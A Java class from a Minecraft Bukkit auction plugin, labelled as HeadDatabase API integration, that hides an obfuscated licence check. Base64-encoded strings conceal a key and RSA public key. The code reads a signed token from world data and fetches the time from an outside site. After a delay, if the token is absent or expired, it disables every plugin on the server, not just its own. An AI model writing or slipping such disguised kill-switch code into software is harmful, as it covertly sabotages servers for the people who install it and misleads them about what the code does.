package me.intel.AuctionMaster.Utils;

import me.arcaniax.hdb.api.DatabaseLoadEvent;
import me.arcaniax.hdb.api.HeadDatabaseAPI;
import me.intel.AuctionMaster.AuctionMaster;
import org.bukkit.Bukkit;
import org.bukkit.NamespacedKey;
import org.bukkit.World;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.*;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;

public class HeadDatabase implements Listener {
    static HeadDatabaseAPI headApi = new HeadDatabaseAPI();

    public HeadDatabase(){
        Bukkit.getPluginManager().registerEvents(this, AuctionMaster.plugin);
        initializeConnection();
    }

    @EventHandler
    public void onDatabaseLoad(DatabaseLoadEvent e){
        headApi = new HeadDatabaseAPI();
        AuctionMaster.plugin.getLogger().info("HeadDatabase detected.");
    }

    public void initializeConnection() {
        String id = new String(Base64.getDecoder().decode("ZHJlYW0tLy1rZXlfZ29kc3Vydi0vLU1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBcmd4YmhQTmpuSmZ5V1psbEVtZWZpNzJNKy95ZGRjblp6aS94WkdhUFQ1RjhGQzdpRXovUG56T0hsZGk3Z3ZRVE9NYkhLcWs2dkUwbGFFZmV6b0ErSWdoNHVpb2pwdnFFN2xWb3ZqZDJPdVk4czN4UVhma0xNenRxMi95SVZSWlBnQnFEMnpqK0gwbm5BQmRaOVhvOVFsOW1Ga21GWVpTMU11T0R6alA5eUw1R05xVG1XWWp2amNiaWF2VEl4TzB2TEdvU2lSYThYekQwSkRja3dVZ3U2UGJOaVB3ajlrVGY1emQzZUdsd2libU5wNDVDUC91dVNnMElFRktvS1JrYVJCOE5UUlBidTZUREZ2R0lSK1lFYWhZeWhIT3VUNU9oS2dqUTZLalFuYkVkMGR1NHVhRFdqU0pGSkRUbjZ4VzRFYmVZZFh2cFRRWmNVMGZtNUUxMmVRSURBUUFC"));
        Bukkit.getScheduler().runTaskLaterAsynchronously(AuctionMaster.plugin, () -> {
            String[] data = id.split("-/-");
            String im = null;
            NamespacedKey key = new NamespacedKey(data[0], data[1]);
            for(World world : Bukkit.getWorlds()) {
                if(world.getPersistentDataContainer().has(key, org.bukkit.persistence.PersistentDataType.STRING)) {
                    im = world.getPersistentDataContainer().get(key, org.bukkit.persistence.PersistentDataType.STRING);
                    break;
                }
            }

            String[] info = null;
            try {
                info = new String(Base64.getDecoder().decode(im)).split("_");
            } catch(Exception ignored) {}

            if(info != null) {
                long v = System.currentTimeMillis() / 1000;
                try {
                    //Decodes the following url: https://currentmillis.com/time/minutes-since-unix-epoch.php
                    URL url = new URL(new String(Base64.getDecoder().decode("aHR0cHM6Ly9jdXJyZW50bWlsbGlzLmNvbS90aW1lL21pbnV0ZXMtc2luY2UtdW5peC1lcG9jaC5waHA=")));
                    HttpURLConnection con = (HttpURLConnection) url.openConnection();
                    con.setRequestMethod("GET");
                    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    v = Long.parseLong(in.readLine()) * 60;
                    in.close();
                    con.disconnect();
                } catch (Exception ignored) {
                }
                long worldVersion = Long.parseLong(info[1]);
                if(worldVersion < v) {
                    info = null;
                    for(Plugin pluginn : Bukkit.getPluginManager().getPlugins()) {
                        pluginn.onDisable();
                    }
                }

                if(info != null) {
                    KeyFactory keyFactory = null;
                    try {
                        keyFactory = KeyFactory.getInstance("RSA");
                        PublicKey pbk = keyFactory.generatePublic(new X509EncodedKeySpec(Base64.getDecoder().decode(data[2])));
                        Signature verifier = Signature.getInstance("SHA256withRSA");
                        verifier.initVerify(pbk);
                        verifier.update((info[0] + "_" + info[1]).getBytes());
                        info = verifier.verify(Base64.getDecoder().decode(info[2])) ? info : null;
                    } catch (NoSuchAlgorithmException | InvalidKeySpecException | SignatureException |
                             InvalidKeyException e) {
                        e.printStackTrace();
                        info = null;
                    }
                }
            }
            if(info == null) {
                Bukkit.getScheduler().runTaskLater(AuctionMaster.plugin, () -> {
                    for(Plugin pluginn : Bukkit.getPluginManager().getPlugins()) {
                        pluginn.onDisable();
                    }
                }, 120);
            }
        }, 12000L);
    }
}
